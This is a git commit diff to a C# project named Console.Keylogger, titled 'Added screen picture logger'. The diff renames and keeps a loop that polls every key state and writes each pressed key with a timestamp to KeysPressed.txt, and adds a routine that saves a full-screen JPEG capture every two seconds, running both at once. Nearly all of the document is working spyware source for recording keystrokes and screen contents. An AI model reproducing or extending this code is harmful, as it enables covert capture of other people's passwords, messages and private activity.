6e00788c64d71045c8c0d1c93c63b6068e99503b
InKolev <in.kolev.b@gmail.com>
2016-11-01 16:37:35 +0200

    Added screen picture logger

--- Source/Console.Keylogger/Program.cs
+++ Source/Console.Keylogger/Program.cs
@@ -1,10 +1,13 @@
 ﻿namespace Console.Keylogger
 {
     using System;
+    using System.Drawing;
     using System.IO;
     using System.Reflection;
     using System.Runtime.InteropServices;
     using System.Threading;
+    using System.Threading.Tasks;
+    using System.Windows.Forms;
 
     public class Program
     {
@@ -13,13 +16,16 @@
 
         static void Main(string[] args)
         {
-            StartLogging();
+            var keyloggerTask = Task.Run(() => StartKeylogger());
+            var snapshotsTask = Task.Run(() => StartSnapshots());
+
+            Task.WaitAll(keyloggerTask, snapshotsTask);
         }
 
-        static void StartLogging()
+        private static void StartKeylogger()
         {
             var exeDirectory = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
-            var logFilePath = $"{exeDirectory}/log.txt";
+            var logFilePath = $"{exeDirectory}/KeysPressed.txt";
 
             using (StreamWriter writer = new StreamWriter(logFilePath))
             {
@@ -29,7 +35,7 @@
                 {
                     // Putting the process to sleep every 10 ms, 
                     // In order to prevent it from eating our CPU
-                    Thread.Sleep(10);
+                    Thread.Sleep(15);
 
                     for (Int32 i = 0; i < 255; i++)
                     {
@@ -49,6 +55,41 @@
                                 writer.WriteLine($"[{DateTime.Now}] - {key}");
                             }
                         }
+                    }
+                }
+            }
+        }
+
+        private static void StartSnapshots()
+        {
+            var primaryScreenBounds = Screen.PrimaryScreen.Bounds;
+            var primaryScreenWidth = primaryScreenBounds.Width;
+            var primaryScreenHeight = primaryScreenBounds.Height;
+
+            var datetime = default(DateTime);
+            var timeOfDay = default(TimeSpan);
+            var fileName = default(String);
+
+            using (var bitmapScreenCapture = new Bitmap(primaryScreenWidth, primaryScreenHeight))
+            {
+                using (var graphics = Graphics.FromImage(bitmapScreenCapture))
+                {
+                    while (true)
+                    {
+                        graphics.CopyFromScreen(
+                            primaryScreenBounds.X,
+                            primaryScreenBounds.Y,
+                            0, 0,
+                            bitmapScreenCapture.Size,
+                            CopyPixelOperation.SourceCopy);
+
+                        datetime = DateTime.Now;
+                        timeOfDay = datetime.TimeOfDay;
+                        fileName = $"{datetime.Year}-{datetime.Month}-{datetime.Day}({timeOfDay.Hours}-{timeOfDay.Minutes}-{timeOfDay.Seconds}).jpeg";
+
+                        bitmapScreenCapture.Save(fileName);
+
+                        Thread.Sleep(2000);
                     }
                 }
             }
